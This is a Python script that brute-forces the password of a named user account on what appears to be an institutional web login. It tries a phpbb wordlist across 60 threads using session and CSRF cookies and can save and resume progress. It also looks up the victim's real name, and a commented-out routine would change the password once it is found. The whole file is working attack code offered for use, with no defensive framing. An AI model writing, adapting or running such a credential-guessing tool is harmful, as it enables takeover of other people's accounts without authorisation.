import time
from main import PASSWORD, INFO, SUCCESS, DANGER, console
from utils import find_user_info, login, change_password, getcookies
import sys
import keyboard
import threading

user = "5396@stgcc"
# user = "5231@stgcc"
attempts = 0
initial_attempts = 0
exit_flag = threading.Event()
attempts_lock = threading.Lock()
cookies = None
state_file = "state.txt"
brute_password = None
threads_num = 60

start_time = None
end_time = None


def save_state(attempts: int):
    with open(state_file, "w") as file:
        file.write(attempts)


def load_state():
    try:
        with open(state_file, "r") as file:
            try:
                attempts = int(file.read())
            except ValueError:
                attempts = 0
            return attempts
    except FileNotFoundError:
        return 0, 0


def keyboard_listener():
    global attempts
    while not exit_flag.is_set():
        if keyboard.is_pressed("q"):
            exit_flag.set()
            save_state(str(attempts))
            console.log("[*] Exiting...", style=INFO)
            break
        elif keyboard.is_pressed("s"):
            elapsed_time = time.time() - start_time
            with attempts_lock:
                current_attempts = attempts
            # Adjust the speed calculation
            attempts_made = current_attempts - initial_attempts
            speed = attempts_made / elapsed_time if elapsed_time > 0 else 0
            console.log(
                f"[*] Attempt {current_attempts}: Time Elapsed: {elapsed_time:.2f}s, Speed: {speed:.2f} attempts/s",
                style=INFO,
            )
            time.sleep(1)


def attempt_login(passwords, index: int = 0) -> str | None:
    console.log(f"[+] Thread {index + 1} started.", style=SUCCESS)
    global attempts, brute_password, end_time
    for password in passwords:
        if exit_flag.is_set():
            end_time = time.time()
            break

        with attempts_lock:
            attempts += 1

        login_info = login(cookies["connect.sid"], cookies["_csrf"], user, password)
        if login_info[0] == 200:
            console.log(f"[+] Password found: {password}", style=SUCCESS)
            brute_password = password
            end_time = time.time()
            return password

        time.sleep(0.005)


def brute(user: str) -> str:
    global attempts, start_time, end_time, initial_attempts, threads_num

    console.log("[*] Starting brute force...", style=INFO)

    # with open(r"wordlist.txt", "r") as file:
    with open(r"D:\wordlists\phpbb.txt", "r") as file:
        passwords = [line.strip() for line in file if line.strip()]

    attempts = load_state()
    initial_attempts = attempts

    start_time = time.time()

    keyboard_thread = threading.Thread(target=keyboard_listener)
    keyboard_thread.start()

    password_chunks = [passwords[i::threads_num] for i in range(threads_num)]
    threads: list[threading.Thread] = []

    for index in range(threads_num):
        thread = threading.Thread(
            target=attempt_login, args=(password_chunks[index], index), daemon=True
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    keyboard_thread.join()

    return None


def change(user: str, old_password: str, new_password: str) -> None:
    global cookies
    console.log("[*] Getting cookies...", style=INFO)
    cookies = getcookies(user, PASSWORD)

    console.log("[*] Logging in...", style=INFO)
    login_info = login(cookies["connect.sid"], cookies["_csrf"], user, old_password)
    console.log(f"[+] Login status: {login_info[0]}", style=SUCCESS)
    if login_info[0] != 200:
        console.log(
            f"[!] Error {login_info[0]}: {login_info[1]}\n[i]Exiting...[/i]",
            style=DANGER,
        )
        sys.exit()

    res = change_password(
        cookies["connect.sid"], cookies["_csrf"], user_info, new_password
    )
    console.log(f"[*] Password change status: {res[0]}", style=INFO)
    if res[0] != 200:
        console.log(
            f"[!] Error {res[0]}: {res[1]}.\n[i]Exiting...[/i]",
            style=DANGER,
        )
        sys.exit()


if __name__ == "__main__":
    user_info = find_user_info(user)

    console.log(
        f"[*] Starting the script with user: {user} ({user_info['first_name'].strip() + ' ' + user_info['surname']})...",
        style=INFO,
    )

    console.log("[*] Getting cookies...", style=INFO)
    cookies = getcookies(user, PASSWORD)

    brute(user)
    console.log(
        f"[*] Total time taken: {round(end_time - start_time, 2)} seconds.", style=INFO
    )
    if brute_password is not None:
        console.log(f"[+] Password found: {brute_password}", style=SUCCESS)
    else:
        console.log("[!] Password not found.", style=DANGER)

    # change(user, "Triangle", "Triangle")
